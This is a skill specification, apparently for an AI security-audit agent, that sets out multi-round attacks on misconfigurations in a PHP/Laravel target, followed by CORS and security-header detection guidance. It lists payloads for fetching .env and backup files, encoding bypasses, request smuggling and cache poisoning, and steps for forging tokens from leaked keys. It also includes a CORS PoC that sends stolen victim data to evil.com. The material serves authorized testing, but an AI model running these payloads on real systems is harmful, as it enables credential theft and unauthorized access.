> **Skill ID**: S-049-B | **Phase**: 4 | **Stage**: 2 (Attack)
> **Input**: attack_plans/{sink_id}_plan.json, Docker container access
> **Output**: exploits/{sink_id}.json, PoC脚本/{sink_id}_poc.py


## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-049-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute progressive multi-round attack against Configuration / Misconfiguration sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 12 attack rounds — if stuck after round 10, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploits/{sink_id}.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST verify misconfiguration is exploitable in current deployment (not just present in config file) — config presence ≠ runtime exposure | FAIL — false positive on overridden/unused config values |

## 8-Round Attack

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R1 - Direct Sensitive Path Access

Request: `/.env`, `/.git/config`, `/.git/HEAD`, `/composer.json`, `/phpinfo.php`, `/adminer`, `/phpmyadmin`, `/telescope`, `/horizon`, `/_debugbar`, `/_profiler`, `/api/documentation`, `/swagger/index.html`, `/log-viewer`

**Evidence:** Any path returns 200 with sensitive content (not a redirect/404).

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R2 - Path Variants

Attempt: `/.env.bak`, `/.env.old`, `/.env.swp`, `/.env.save`, `/.env~`, `/.env.orig`, `/.env.dist`, `/.env.example`, `/.env.production`, `/.env.local`, `/config.php.bak`, `/database.sql`, `/backup.zip`, `/backup.tar.gz`, `/db.sql`, `/dump.sql`, `/www.zip`, `/site.tar.gz`

**Evidence:** Backup/variant files are accessible and contain credentials or configuration data.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R3 - Case Variation & Encoding Bypass

- Case variation: `/.ENV`, `/.Env`, `/.GIT/config`
- URL encoding: `/%2e%65%6e%76`, `/.%65nv`
- Double encoding: `/%252e%2565nv`
- Trailing characters: `/.env%00`, `/.env%0a`, `/.env.`
- Traversal: `/public/../.env`

**Evidence:** Sensitive files accessed via alternative encoding.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R4 - Nginx/Apache Configuration Bypass

- Nginx alias traversal: `/assets../../../.env`
- Apache htaccess: `/.htpasswd`, `/.htaccess`
- Semicolon trick: `/..;/admin`, `/admin;.js`
- Off-by-slash: `/static../admin/`
- Normalization: `/./admin`, `//admin`, `/admin/./`

**Evidence:** Restricted paths accessed via server-specific tricks.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R5 - HTTP Method Bypass

`OPTIONS /.env`, `TRACE /.env`, `HEAD /admin`, `PROPFIND /` (WebDAV enumeration), `MOVE`/`COPY` operations. Send requests to test whether TRACE reflects headers (XST).

**Evidence:** Restricted resources return responses to alternative methods, or TRACE reflects sensitive headers.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R6 - Default Credential Enumeration

Attempt default credentials against the following targets: application login, `/adminer`, `/phpmyadmin`, API Basic Auth, Telescope/Horizon authentication. Maximum 5 attempts per endpoint.

**Evidence:** Successful login using default credentials (returns Session Cookie or authenticated content).

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R7 - CORS Origin Mutation

Test: `Origin: https://evil.com`, `Origin: null`, `Origin: https://subdomain.target.com`, `Origin: https://target.com.evil.com`, `Origin: https://targett.com`

Check whether `Access-Control-Allow-Origin` reflects the attacker's Origin with `Access-Control-Allow-Credentials: true`.

**Evidence:** Attacker Origin is reflected and credentials are allowed.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R8 - Combination (Config Leak → Keys → Exploitation)

1. Retrieve `.env` -> extract `APP_KEY`, `DB_PASSWORD`, `JWT_SECRET`
2. Use `APP_KEY` to decrypt Laravel Cookies or forge signed URLs
3. Use `JWT_SECRET` to forge admin JWT Token
4. Use database credentials to connect via exposed Adminer/phpMyAdmin
5. Use API keys to access third-party services (AWS, Stripe)

**Evidence:** Configuration data is used to achieve further unauthorized access.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R9 - HTTP Request Smuggling

Analyze HTTP parsing differences between the front-end proxy and back-end server:

- **CL.TE**: Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`
  ```
  POST / HTTP/1.1
  Content-Length: 13
  Transfer-Encoding: chunked

  0

  GET /admin HTTP/1.1
  ```
- **TE.CL**: Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`
- **TE.TE**: Both ends use TE but handle obfuscation differently
  - `Transfer-Encoding: chunked` vs `Transfer-Encoding : chunked` (space)
  - `Transfer-Encoding: xchunked`
- **HTTP/2 Downgrade**: Smuggling during HTTP/2 to HTTP/1.1 conversion

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R10 - Web Cache Poisoning

- Identify caching behavior (`X-Cache`, `CF-Cache-Status`, `Age` headers)
- **Unkeyed Header Injection**:
  ```
  X-Forwarded-Host: evil.com  → cached page includes evil.com resources
  X-Original-URL: /admin      → cache bypass
  ```
- **Parameter Hiding**:
  - `GET /page?cb=1` cached, then `GET /page?cb=1&evil=<script>` is served
  - Semicolon delimiter: `GET /page?legit=1;evil=<script>`
- **Cache Deception**: `/api/user/profile.css` caches credentialed content
- Laravel: `Cache-Control` header configuration
- Nginx: `proxy_cache_key` configuration

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R11 - Subdomain Takeover Detection

- Analyze whether services pointed to by DNS CNAME records are still active:
  - GitHub Pages: CNAME points to `*.github.io` but repository is deleted
  - Heroku: CNAME points to `*.herokuapp.com` but app is deleted
  - AWS S3: CNAME points to `*.s3.amazonaws.com` but Bucket is deleted
  - Azure: CNAME points to `*.azurewebsites.net` but app is deleted
- Look for `NXDOMAIN` or specific error page signatures
- Check whether IP addresses from `A` records still belong to the target

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R12 - PHP Runtime Configuration Audit

Locate dangerous settings in `php.ini` / `phpinfo()`:

| Setting | Dangerous Value | Impact |
|---------|----------------|--------|
| `allow_url_include` | `On` | RFI/LFI escalated to RCE |
| `allow_url_fopen` | `On` | SSRF |
| `display_errors` | `On` | Information disclosure |
| `expose_php` | `On` | Version information disclosure |
| `register_argc_argv` | `On` | pearcmd.php LFI → RCE |
| `open_basedir` | Not set | No file access restriction |
| `disable_functions` | Empty | No function restriction |
| `session.cookie_httponly` | `Off` | Cookie stolen by JS |
| `session.cookie_secure` | `Off` | Cookie leaked over HTTP |
| `session.use_strict_mode` | `Off` | Session fixation attack |
| `upload_max_filesize` | Excessively large | DoS risk |
| `max_input_vars` | Excessively large | Hash DoS |
| `serialize_handler` | `php` | Session deserialization discrepancy |

## Evidence Requirements

| Evidence Type | Example |
|---|---|
| .env contents | Response contains `APP_KEY=base64:...`, `DB_PASSWORD=secret` |
| phpinfo output | Displays PHP version, modules, environment variables |
| Default credential login | `admin/admin` login sets Session Cookie |
| Git configuration | `[remote "origin"] url = ...` visible |
| Missing headers | Response lacks `X-Frame-Options`, `CSP` |
| CORS misconfiguration | `Access-Control-Allow-Origin: https://evil.com` reflected |
| Debug information | Stack trace contains file paths and variable values |

## Detection (Vulnerability Pattern Recognition)

The following code/configuration patterns indicate potential configuration vulnerabilities:
- Pattern 1: `APP_DEBUG=true` / `display_errors=On` / `error_reporting(E_ALL)` — Debug mode not disabled in production, leaking stack traces, paths, SQL
- Pattern 2: `/.env` / `/.git/config` / `/phpinfo.php` accessible via HTTP — Sensitive files not blocked by the web server
- Pattern 3: `CORS: Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` — Permissive CORS allows any site to make credentialed cross-origin requests
- Pattern 4: Response headers missing `Content-Security-Policy` / `Strict-Transport-Security` — Missing security headers lower the barrier for XSS and man-in-the-middle attacks
- Pattern 5: `session.cookie_httponly=Off` / `session.cookie_secure=Off` — Session Cookie can be read by JS or transmitted over HTTP
- Pattern 6: `/adminer`, `/telescope`, `/horizon` accessible without authentication — Admin panels exposed to the public internet

## Key Insight

> **Key Point**: Configuration auditing is the "attack surface amplifier" for all other vulnerability categories — paths leaked by APP_DEBUG help LFI, leaked APP_KEY makes deserialization RCE possible, and missing CSP allows XSS to execute arbitrary code. Configuration auditing MUST be performed as the first baseline check in every assessment, and its findings directly influence the attack strategies of other auditors.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger Smart Pivot:

1. Re-reconnaissance: Re-read target code to look for missed filtering logic and alternative entry points
2. Cross-intelligence: Consult the shared findings store (`$WORK_DIR/audit_session.db`) for related findings from other experts
3. Decision tree matching: Select a new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. If no new paths are found, terminate early to avoid wasting rounds producing hallucinated results

## Prerequisites & Scoring (MUST be completed)

The output `exploits/{sink_id}.json` MUST include the following two objects:

### prerequisite_conditions
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for the route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` MUST list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-Dimensional Scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-CONFIG-001"
}
```
- All reason fields MUST contain specific justification and MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (see `shared/evidence_contract.md`):
- `EVID_CFG_CONFIG_LOCATION` — Configuration file location ✅Required
- `EVID_CFG_IMPACT_SCOPE` — Impact scope ✅Required
- `EVID_CFG_SECURITY_SWITCH` — Security switch status ✅Required
- `EVID_CFG_RUNTIME_SETTING` — Runtime setting (conditionally required)

Missing required EVID → conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write-back

After the attack cycle ends, write experience to the attack memory store (see `shared/attack_memory.md` for write protocol):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write; SQLite WAL mode automatically ensures concurrency safety.

## Output

After completing all rounds, write the final results to `$WORK_DIR/exploits/{sink_id}.json`.

> **Strictly follow the fill-in template in `shared/OUTPUT_TEMPLATE.md` to generate the output file.**
> JSON structure MUST conform to `schemas/exploit_result.schema.json`; field constraints are defined in `shared/data_contracts.md` Section 9.
> Run the 3 check commands at the bottom of OUTPUT_TEMPLATE.md before submission.

## Collaboration

- Pass discovered credentials to the Privilege Escalation Auditor for privilege escalation testing
- Pass API keys/secrets to the Information Disclosure Auditor
- Pass JWT Secret to the Privilege Escalation Auditor for Token forgery (R5)
- Submit all findings to the QA Reviewer for evidence verification

## Real-time Sharing & Second-Order Tracking

### Shared Write
When the following information is discovered, it **MUST** be written to the shared findings store (`$WORK_DIR/audit_session.db`):
- Credentials leaked from .env (DB_PASSWORD, APP_KEY, JWT_SECRET) → `finding_type: credential/secret_key`
- Debug endpoint exposure → `finding_type: endpoint`
- Default credentials are valid → `finding_type: credential`

### Shared Read
Read the shared findings store before starting the attack phase; leverage internal paths discovered by the Information Disclosure Auditor.

## Constraints

- Maximum 5 default credential attempts per endpoint to avoid account lockout
- MUST NOT modify or delete server configurations
- Record complete HTTP request/response for each confirmed finding

## CORS Misconfiguration Detection

Cross-Origin Resource Sharing (CORS) misconfiguration is one of the most common and high-risk configuration vulnerabilities in web applications. Attackers can exploit CORS misconfiguration to read victims' sensitive data from malicious sites.

### Misconfiguration Pattern 1: Wildcard + Credentials (Invalid but existing misconfiguration)

When a server simultaneously sets `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`, although the browser will reject this combination, it indicates that the developer lacks understanding of the CORS mechanism, and it is usually accompanied by other exploitable misconfigurations.

```php
// ❌ Incorrect configuration example — Laravel Middleware
class CorsMiddleware
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);
        $response->headers->set('Access-Control-Allow-Origin', '*');
        $response->headers->set('Access-Control-Allow-Credentials', 'true'); // Browser will ignore
        $response->headers->set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
        return $response;
    }
}
```

**Detection Rule:**
- Response contains both `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`
- Mark as `potential_risk`, continue analyzing whether dynamic Origin reflection exists

### Misconfiguration Pattern 2: Dynamic Origin Reflection

This is the most dangerous CORS misconfiguration. The server directly echoes the `Origin` header from the request into the `Access-Control-Allow-Origin` response header, allowing any site to read data with credentials.

```php
// ❌ Dangerous: Directly reflecting Origin
class CorsMiddleware
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);
        // Reflects without validation — any Origin is trusted
        $origin = $request->header('Origin') ?? $_SERVER['HTTP_ORIGIN'] ?? '';
        $response->headers->set('Access-Control-Allow-Origin', $origin);
        $response->headers->set('Access-Control-Allow-Credentials', 'true');
        return $response;
    }
}

// ✅ Correct approach: Whitelist validation
$allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];
$origin = $request->header('Origin');
if (in_array($origin, $allowedOrigins, true)) {
    $response->headers->set('Access-Control-Allow-Origin', $origin);
    $response->headers->set('Access-Control-Allow-Credentials', 'true');
}
```

**Detection Rule:**
1. Send `Origin: https://evil-attacker.com`, analyze whether the response reflects that Origin
2. Send `Origin: https://another-evil.com`, confirm whether all Origins are reflected
3. If `Access-Control-Allow-Credentials: true` is also present → `confirmed` level vulnerability

**Attack Steps:**
1. Attacker deploys a malicious page on `evil.com`
2. Victim visits `evil.com`, JavaScript makes a credentialed cross-origin request
3. Target server reflects `evil.com` as the allowed Origin
4. Browser allows `evil.com` to read the response data (containing the victim's sensitive information)

```javascript
// PoC deployed by the attacker on evil.com
fetch('https://target.com/api/user/profile', {
    credentials: 'include'  // Carries victim's Cookie
})
.then(r => r.json())
.then(data => {
    // Steal victim's personal information, tokens, session data, saved passwords
    fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

### Misconfiguration Pattern 3: Subdomain / Null Origin Bypass

Some developers validate Origin via regex or string matching, but the implementation has logic flaws.

```php
// ❌ Incorrect subdomain validation — can be bypassed
function isAllowedOrigin($origin) {
    // Attacker can register target.com.evil.com to bypass
    if (strpos($origin, 'target.com') !== false) {
        return true;
    }
    return false;
}

// ❌ Accepts null Origin — can be triggered via iframe sandbox
if ($origin === 'null' || $origin === '') {
    $response->headers->set('Access-Control-Allow-Origin', 'null');
    $response->headers->set('Access-Control-Allow-Credentials', 'true');
}

// ❌ Regex has flaws — missing anchors
if (preg_match('/https?:\/\/.*\.target\.com/', $origin)) {
    // evil.target.com.attacker.com also matches
    $response->headers->set('Access-Control-Allow-Origin', $origin);
}

// ✅ Correct regex validation
if (preg_match('/^https:\/\/[\w-]+\.target\.com$/', $origin)) {
    $response->headers->set('Access-Control-Allow-Origin', $origin);
}
```

**Detection Rule:**
- Send `Origin: null`, analyze whether `Access-Control-Allow-Origin: null` is returned
- Send `Origin: https://target.com.evil.com`, analyze whether the Origin is accepted
- Send `Origin: https://evil-target.com`, analyze prefix/suffix matching bypass
- Send `Origin: https://sub.target.com` (non-existent subdomain), analyze whether it is trusted

**Attack Steps (Null Origin Attack):**
```html
<!-- Trigger null Origin via sandboxed iframe -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
    <script>
        fetch('https://target.com/api/sensitive-data', {
            credentials: 'include'
        })
        .then(r => r.text())
        .then(d => parent.postMessage(d, '*'));
    </script>
"></iframe>
```

### CORS Detection Checklist Summary

| Test Item | Origin Payload | Determination Criteria | Severity |
|-----------|---------------|----------------------|----------|
| Wildcard + Credentials | Any | `ACAO: *` + `ACAC: true` | Medium |
| Dynamic Reflection | `https://evil.com` | Origin reflected as-is + `ACAC: true` | Critical |
| Null Origin | `null` | `ACAO: null` + `ACAC: true` | High |
| Subdomain Bypass | `https://target.com.evil.com` | Origin accepted | High |
| Prefix Bypass | `https://eviltarget.com` | Origin accepted | High |
| Regex Flaw | `https://sub.target.com.attacker.com` | Origin accepted | High |

> **Key Insight:** The core risk of CORS misconfiguration lies in **bypassing the Same-Origin Policy (SOP)**. When `Access-Control-Allow-Credentials: true` is combined with insecure Origin validation, attackers can steal authenticated user data from any malicious site. During detection, you MUST test at least 3 Origin variants (evil domain, null, subdomain trick) — a single test is insufficient to cover all bypass scenarios.

## HTTP Security Header Missing Detection

HTTP security response headers are the "first line of defense" for web applications. Missing critical security headers significantly increases the success rate of multiple attacks. This section covers detection for all OWASP-recommended security headers.

### 1. Missing X-Frame-Options → Clickjacking

When a response lacks the `X-Frame-Options` header and CSP has no `frame-ancestors` directive, the page can be embedded in a malicious iframe, tricking users into performing sensitive operations unknowingly.

```php
// ❌ Missing X-Frame-Options — can be embedded in iframe
// No protection headers

// ✅ Correct configuration
header('X-Frame-Options: DENY');
// Or restrict to same origin
header('X-Frame-Options: SAMEORIGIN');
// Recommended to also use CSP frame-ancestors (more flexible, supports multiple domains)
header("Content-Security-Policy: frame-ancestors 'self' https://trusted.com");
```

**Detection Rule:**
- [x] No `X-Frame-Options` in response headers
- [x] No `Content-Security-Policy` in response headers, or CSP lacks `frame-ancestors`
- [x] Page contains sensitive operations (form submissions, password changes, transfers, account deletion, email changes)
- If all conditions above are met → flag Clickjacking risk

### 2. Missing Content-Security-Policy → XSS Risk Elevated

CSP is the most effective defense-in-depth mechanism against XSS. Without CSP, once an XSS injection point exists, the attacker's payload will execute without any restrictions.

```php
// ❌ No CSP — XSS payload executes freely
// No CSP header

// ❌ Overly permissive CSP (equivalent to none)
header("Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'");

// ✅ Strict CSP configuration
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'self'; frame-ancestors 'self'");
```

**Detection Rule:**
- [x] No `Content-Security-Policy` in response headers
- [x] CSP contains `unsafe-inline` (allows inline scripts)
- [x] CSP contains `unsafe-eval` (allows eval)
- [x] `script-src` contains `*` or overly broad domains
- [x] CSP uses `data:` URI as script-src

**Common CSP Bypass Patterns:**
| CSP Configuration | Bypass Method | Risk |
|-------------------|--------------|------|
| `script-src 'unsafe-inline'` | Directly inject `<script>` tag | Critical |
| `script-src cdn.jsdelivr.net` | Host malicious JS on CDN | High |
| `script-src 'self' 'unsafe-eval'` | Execute injected code via `eval()` | High |
| `default-src 'self'; script-src *` | Load arbitrary external scripts | Critical |

### 3. Missing Strict-Transport-Security → SSL Stripping

HTTPS sites without the HSTS header are susceptible to SSL Stripping attacks. An attacker (e.g., man-in-the-middle on public WiFi) can downgrade HTTPS to HTTP and intercept all plaintext traffic.

```php
// ❌ Missing HSTS — vulnerable to SSL Strip
// Relies only on HTTPS redirect; hijack window exists on first visit

// ✅ Correct HSTS configuration
header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
// max-age=31536000 — 365 days
// includeSubDomains — covers all subdomains
// preload — join browser preload list (requires separate submission)
```

**Detection Rule:**
- [x] No `Strict-Transport-Security` in HTTPS site response headers
- [x] HSTS `max-age` value too small (< 15552000, i.e., 180 days)
- [x] Missing `includeSubDomains` (subdomains not protected)
- [x] No HSTS header in HTTP-to-HTTPS 301 redirect

### 4. X-Powered-By Information Leak

The `X-Powered-By` header exposes server technology stack and version information, helping attackers precisely match exploits for known vulnerabilities.

```php
// ❌ Default exposure — helps attackers fingerprint
// X-Powered-By: PHP/8.1.2
// X-Powered-By: Express
// Server: Apache/2.4.51 (Ubuntu)

// ✅ Remove in PHP
ini_set('expose_php', 'Off');   // php.ini: expose_php = Off
header_remove('X-Powered-By');
header_remove('Server');

// ✅ Remove in Laravel
// app/Http/Middleware/RemoveHeaders.php
class RemoveHeaders
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);
        $response->headers->remove('X-Powered-By');
        $response->headers->remove('Server');
        return $response;
    }
}
```

**Detection Rule:**
- [x] Response headers contain `X-Powered-By`
- [x] `Server` in response headers contains version number (e.g., `Apache/2.4.51`)
- [x] Response headers contain `X-AspNet-Version` or `X-AspNetMvc-Version`

### 5. Other OWASP Recommended Security Headers

**X-Content-Type-Options:**
```php
// Prevent browser MIME type sniffing — block non-script files from being executed as scripts
header('X-Content-Type-Options: nosniff');
```

**Referrer-Policy:**
```php
// Control Referer header leak scope — prevent sensitive parameters in URLs from leaking to third parties
header('Referrer-Policy: strict-origin-when-cross-origin');
```

**Permissions-Policy (formerly Feature-Policy):**
```php
// Restrict browser features (camera, microphone, geolocation, payment, autoplay, fullscreen)
header('Permissions-Policy: camera=(), microphone=(), geolocation=()');
```

**Cache-Control (sensitive pages):**
```php
// Prevent sensitive pages from being cached — especially in shared computer/proxy scenarios
header('Cache-Control: no-store, no-cache, must-revalidate, private');
header('Pragma: no-cache');
```

### HTTP Security Header Complete Detection Checklist

| Header | Impact of Missing | Recommended Value | Severity |
|--------|------------------|-------------------|----------|
| `X-Frame-Options` | Clickjacking | `DENY` or `SAMEORIGIN` | Medium |
| `Content-Security-Policy` | No defense-in-depth for XSS | Strict policy (see above) | High |
| `Strict-Transport-Security` | SSL Stripping | `max-age=31536000; includeSubDomains` | High |
| `X-Content-Type-Options` | MIME Sniffing | `nosniff` | Low |
| `X-Powered-By` | Information disclosure | Remove this header | Low |
| `Referrer-Policy` | URL parameter leak | `strict-origin-when-cross-origin` | Low |
| `Permissions-Policy` | Feature abuse | Disable unnecessary features as needed | Low |
| `Cache-Control` | Sensitive data cached | `no-store, private` | Medium |
| `X-XSS-Protection` | Legacy browser XSS | `0` (deprecated in modern browsers; recommended to disable to avoid side effects) | Info |

### Automated Detection Script Example

```php
function auditSecurityHeaders(array $responseHeaders): array
{
    $findings = [];
    $required = [
        'X-Frame-Options'             => ['severity' => 'medium', 'impact' => 'Clickjacking'],
        'Content-Security-Policy'     => ['severity' => 'high',   'impact' => 'XSS defense-in-depth missing'],
        'Strict-Transport-Security'   => ['severity' => 'high',   'impact' => 'SSL Stripping'],
        'X-Content-Type-Options'      => ['severity' => 'low',    'impact' => 'MIME Sniffing'],
        'Referrer-Policy'             => ['severity' => 'low',    'impact' => 'URL parameter leak'],
        'Permissions-Policy'          => ['severity' => 'low',    'impact' => 'Browser feature abuse'],
    ];

    // Check for missing security headers
    foreach ($required as $header => $meta) {
        $found = false;
        foreach ($responseHeaders as $key => $value) {
            if (strcasecmp($key, $header) === 0) {
                $found = true;
                break;
            }
        }
        if (!$found) {
            $findings[] = [
                'vuln_type'   => 'Configuration',
                'sub_type'    => 'missing_header',
                'header'      => $header,
                'severity'    => $meta['severity'],
                'impact'      => $meta['impact'],
                'remediation' => "Add '{$header}' response header",
            ];
        }
    }

    // Check for information disclosure headers
    $leakHeaders = ['X-Powered-By', 'Server', 'X-AspNet-Version'];
    foreach ($leakHeaders as $header) {
        foreach ($responseHeaders as $key => $value) {
            if (strcasecmp($key, $header) === 0) {
                $findings[] = [
                    'vuln_type'   => 'Configuration',
                    'sub_type'    => 'information_leak',
                    'header'      => $header,
                    'value'       => $value,
                    'severity'    => 'low',
                    'impact'      => 'Technology stack fingerprinting',
                    'remediation' => "Remove '{$header}' header from responses",
                ];
            }
        }
    }

    return $findings;
}
```

> **Key Insight:** Missing HTTP security headers are usually not directly exploitable vulnerabilities on their own, but they significantly **lower the barrier for other attacks**. For example: missing CSP escalates XSS from "may execute limited code" to "can execute arbitrary code"; missing HSTS allows a network-layer man-in-the-middle to directly downgrade HTTPS. Security header detection SHOULD be performed as a **baseline check** in every audit, with priority on CSP and HSTS — the two highest-impact headers. During auditing, it is recommended to use a checklist for item-by-item verification to ensure no omissions.



## Output Contract

| Output File | Path | Description |
|-------------|------|-------------|
| Exploit result | `$WORK_DIR/exploits/{sink_id}.json` | Final verdict + all round records |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |

## Examples

### ✅ GOOD Example — Complete, Valid Exploit Result

```json
{
  "sink_id": "config_env_exposure_001",
  "final_verdict": "confirmed",
  "rounds_executed": 3,
  "successful_round": 1,
  "payload": "GET /.env",
  "evidence_result": "Response contains APP_KEY=base64:xxx, DB_PASSWORD=prod_secret_123, MAIL_PASSWORD=smtp_pass",
  "severity": {
    "level": "C",
    "score": 2.55,
    "cvss": 8.5
  }
}
```

**Why this is good:**
- `evidence_result` contains specific, verifiable proof of exploitation
- `severity` scoring is consistent: score 2.55 → cvss 8.5 → level `C`
- `rounds_executed` shows progressive effort, not a single blind attempt
- All required fields are populated with concrete values

### ❌ BAD Example — Incomplete, Invalid Exploit Result

```json
{
  "sink_id": "config_env_exposure_001",
  "final_verdict": "confirmed",
  "rounds_executed": 1,
  "successful_round": 1,
  "payload": "GET /.env",
  "evidence_result": "",
  "failure_reason": "",
  "severity": {
    "level": "L",
    "score": null
  }
}
```

**Issues:**
- evidence_result is empty — no .env content shown as proof
- failure_reason is empty — no context about what was exposed
- severity_level 'L' for .env exposure with production credentials — should be C or H

---

## Pre-submission Self-check (MUST be executed)

After completing the exploit JSON, perform item-by-item self-checks per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); continue only after all are ✅
2. Execute the specialized self-checks below (S1-S3); submit only after all are ✅
3. If any item is ❌ → correct and re-check; MUST NOT skip

### Specialized Self-check (Config Auditor specific)
- [ ] S1: Insecure configuration items (display_errors/allow_url_include/open_basedir) are specifically annotated
- [ ] S2: Differences between default configuration and current configuration are compared and displayed
- [ ] S3: Configuration remediation recommendations include specific php.ini/Apache/Nginx directives

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
